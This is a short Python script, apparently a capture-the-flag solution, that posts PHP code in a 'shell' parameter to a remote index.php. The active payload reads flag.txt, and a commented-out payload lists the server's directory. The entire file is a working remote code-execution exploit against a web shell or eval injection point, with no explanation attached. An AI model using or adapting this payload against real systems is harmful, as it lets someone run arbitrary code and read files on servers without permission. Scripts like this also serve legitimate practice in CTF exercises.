

import requests

#data={'shell':'print_r(scandir(getcwd()));'}
data={'shell':"print_r(fgets(fopen('./flag.txt','r')));"}

response=requests.post('http://111.198.29.45:36580/index.php',data=data)

response.encoding=response.apparent_encoding

print(response.text)
